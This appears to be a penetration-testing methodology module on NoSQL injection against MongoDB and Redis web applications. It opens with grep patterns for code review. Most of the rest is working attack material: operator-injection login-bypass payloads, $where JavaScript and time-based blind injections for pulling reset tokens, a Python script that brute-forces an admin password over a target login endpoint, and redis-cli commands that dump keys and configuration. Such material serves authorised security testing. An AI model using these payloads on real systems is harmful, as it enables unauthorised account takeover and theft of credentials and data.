# VULN MODULE — NoSQL Injection
# Asset: webapp (MongoDB, CouchDB, Redis, Cassandra)
# CWE-943 | Report prefix: WEB-NOSQL

## THREAT MODEL

NoSQL databases use non-SQL query languages. Injection occurs when
user input is embedded in query operators without sanitization.
MongoDB is most common; operators like $gt, $where, $regex enable
auth bypass, data extraction, and sometimes RCE ($where with JS eval).

## WHITEBOX PATTERNS

```bash
# MongoDB (Node.js / Python / PHP)
grep -rn "find(\|findOne(\|aggregate(\|update(\|insert(" \
  --include="*.js" --include="*.ts" --include="*.py" --include="*.php"

# Direct req.body into query (most dangerous pattern)
grep -rn "req\.body\b" --include="*.js" --include="*.ts" -A3 | \
  grep -i "find\|query\|where\|filter"

# $where operator (JavaScript execution in MongoDB)
grep -rn "\$where\|\$function\|\$accumulator" \
  --include="*.js" --include="*.ts" --include="*.py"

# Mongoose (check for type coercion)
grep -rn "\.findOne\|\.find\|\.findById" --include="*.js" -A5 | \
  grep "req\.\(body\|query\|params\)"
```

## DISCOVERY — INITIAL PROBES

Inject these characters into any parameter to break syntax or trigger errors:
```
$   {   }   \   "   `   ;   %00
```
Any changed response (error, different status, different content) → potential injection point.

## MONGODB OPERATOR REFERENCE

| Operator | Description |
|---|---|
| `$ne` | Not equal — matches any value other than specified (`{"$ne": null}` = any non-null) |
| `$gt` | Greater than — `{"$gt": ""}` matches any non-empty string |
| `$regex` | Regex match — used for character-by-character blind extraction |
| `$where` | JavaScript expression — full JS execution on MongoDB server |
| `$exists` | Field exists — `{"$exists": true}` matches docs that have the field |
| `$eq` | Equal — standard equality match |

## PAYLOADS — MONGODB

### Auth bypass via operator injection
```bash
# If login query is: db.users.findOne({username: INPUT, password: INPUT})
# JSON body:
{"username": {"$gt": ""}, "password": {"$gt": ""}}
# $gt:"" = "greater than empty string" = matches any non-empty value → returns first user (usually admin)

# $ne bypass:
{"username": "admin", "password": {"$ne": null}}

# URL-encoded form body — bracket notation carries operators:
POST /login
Content-Type: application/x-www-form-urlencoded
username=admin&password[$ne]=null

# URL query parameter:
GET /login?username[$gt]=&password[$gt]=

# Array injection:
{"username": "admin", "password": ["wrongpass", "admin"]}
```

### $where JavaScript injection (MongoDB — string concatenation into $where)
```javascript
// If query uses: db.collection.find({$where: "this.email == " + email + " && this.token == " + token})
// Inject into email (URL-encoded form):
email=user@example.com'+||+TRUE;//&token=
// Result: this.email == 'user@example.com' || TRUE; // && this.token ==
// The comment (//) neutralizes the rest → matches all documents

// Classic $where string escape patterns:
' || '1'=='1        → always true
'; return true; var a='   → auth bypass
'; sleep(5000); var a='   → time-based blind

// JSON body $where operator injection:
{"email": "admin@example.com", "token": {"$where": "sleep(5000)"}}
```

### $where time-based blind data extraction
```json
{
  "email": "admin@example.com",
  "token": {
    "$where": "if(this.resetToken.startsWith('a')) { sleep(5000); return true; } else { return true; }"
  }
}
```
If response takes ~5s → first char of `resetToken` is `'a'`. Iterate through the charset
character by character to enumerate the full field value (reset tokens, passwords, etc.).

### $regex for data extraction (blind injection)
```bash
# Extract username character by character:
{"username": {"$regex": "^a"}}   # true if starts with 'a'
{"username": {"$regex": "^ad"}}  # true if starts with 'ad'

# Automate with Python:
python3 << 'EOF'
import requests, string

url = "https://target.com/api/login"
charset = string.ascii_lowercase + string.digits + string.punctuation
known = ""

for i in range(30):
    for char in charset:
        payload = {"username": "admin",
                   "password": {"$regex": f"^{known}{char}"}}
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 200:
            known += char
            print(f"Found: {known}")
            break

print(f"Password: {known}")
EOF
```

### Redis injection
```bash
# If user input reaches Redis EVAL or raw commands:
# KEYS * → enumerate all keys
# GET admin_session → steal session
redis-cli -h target.com -p 6379 KEYS "*"
redis-cli -h target.com -p 6379 CONFIG GET "*"
```

## SECOND-ORDER NOSQL INJECTION

Input is stored without immediate execution (e.g., in a queue or a profile field),
then later retrieved and embedded unsanitized into a NoSQL query by a background job.

Detection: trace all stored user-controllable data through to its later query usage.
Use OOB callbacks (OAST) rather than direct response observation — execution is delayed.
Test import features, job queues, async notification handlers, and scheduled tasks.

## TOOLS

```bash
# NoSQLMap
pip install nosqlmap
python nosqlmap.py  # interactive

# nosql-injection-fuzzer
pip install nosql-injection-fuzzer
```
